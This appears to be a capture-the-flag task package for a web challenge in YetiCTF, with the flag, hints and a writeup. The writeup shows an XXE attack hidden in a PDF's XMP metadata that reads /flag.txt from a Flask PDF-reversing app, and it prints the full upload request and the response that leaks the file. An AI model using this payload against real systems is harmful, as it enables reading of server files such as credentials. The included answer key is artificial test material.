## Category:
* Web

## Description:
Мой друг долго не мог понять, что не так с pdf'кой с того сайта. АХАХАХ 
/flag.txt

## Flag:
* YetiCTF{1eV3l_ulTRa_H4ck3r}

## Hints
1. Где храниться метаданные в pdf файлах?
2. Что за сущность такая?
3. xmp -> xxe (Это на случай если никто не решит и до конца останеться 30 минут)

## TODO/Issues:
* Crontab don't working in docker container. This can lead to out of storange, beacause all uploaded pdfs save in /tmp/pdfcache.

## Deploy:
* `docker build -t jokester . && docker run -d -p 4040:4040 jokester`
* `http://127.0.0.1:4040`

## Writeup:

### Application
Web flask based python application for reverse pdf files (first page = last page and last page = first page).

### Vulnerabulity
Application use pikepdf 2.9.2 lib. This lib vulnerable to xmp xxe in pdf file, while reading pdf metadata. When you loading pdf file, you can check: pdf version, page quantity, metadata(vuln). See more in exploit chapter.

### Exploit

#### Request

```
POST / HTTP/1.1
Host: 192.168.50.232:4040
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------2035132012485856836846648411
Content-Length: 38238
Origin: http://192.168.50.232:4040
Connection: close
Referer: http://192.168.50.232:4040/
Upgrade-Insecure-Requests: 1

-----------------------------2035132012485856836846648411
Content-Disposition: form-data; name="file"; filename="malicose_new.pdf"
Content-Type: application/pdf

%PDF-1.4
%¿÷¢þ
1 0 obj
<< /Metadata 3 0 R /Pages 4 0 R /Type /Catalog >>
endobj
2 0 obj
<< /CreationDate (D:20211011185659+05'00') /ModDate (D:20211011185659+05'00') /Producer (iText® 5.5.11 ©2000-2017 iText Group NV \(AGPL-version\)) /Title <feff04170430044f0432043b0435043d04380435> >>
endobj
3 0 obj
<< /Subtype /XML /Type /Metadata /Length 326 >>
stream
<?xpacket begin='\xef\xbb\xbf' id='W5M0MpCehiHzreSzNTczkc9d'?>
<!DOCTYPE rdf:RDF [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<x:xmpmeta xmlns:x='adobe:ns:meta/' x:xmptk='Image'>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<note>
<to>&xxe;</to>
<from>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</from>
</note>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end='w'?>

endstream
endobj
4 0 obj
<< /Count 1 /Kids [ 5 0 R ] /Type /Pages >>
endobj
5 0 obj
<< /Contents 6 0 R /MediaBox [ 0 0 612 792 ] /Parent 4 0 R /Resources << /Font << /F1 7 0 R /F2 8 0 R >> >> /Type /Page >>
endobj


[...SOME PDF DATA...]


0000004537 00000 n 
0000018684 00000 n 
trailer << /Info 2 0 R /Root 1 0 R /Size 17 /ID [<fbb909c8e1ac9e809ed63bb50b18fa2a><aa5ddc7af815478197a1ba39b3a0768d>] >>
startxref
37455
%%EOF

-----------------------------2035132012485856836846648411--

```

#### Response

```
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 21 Oct 2021 14:41:16 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 3091

<!doctype html>
<title>PDF Reverser - PDF Reverser</title>
<link rel="stylesheet" href="/static/css/bootstrap.css">


[...SOME HTML...]


    </div>
    <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordionExample">
      <div class="card-body">
        &lt;x:xmpmeta xmlns:x=&#34;adobe:ns:meta/&#34; x:xmptk=&#34;Image&#34;&gt;
&lt;rdf:RDF xmlns:rdf=&#34;http://www.w3.org/1999/02/22-rdf-syntax-ns#&#34;&gt;
&lt;note&gt;
&lt;to&gt;YetiCTF{1eV3l_ulTRa_H4ck3r}
&lt;/to&gt;
&lt;from&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/from&gt;
&lt;/note&gt;
&lt;/rdf:RDF&gt;
&lt;/x:xmpmeta&gt;
      </div>
    </div>
  </div>
</div>
<div class="container text-center">  
</div>
</section>

<script type="text/javascript" src="/static/js/jquery-3.6.0.min.js"></script>
<script type="text/javascript" src="/static/js/bootstrap.js"></script>
```
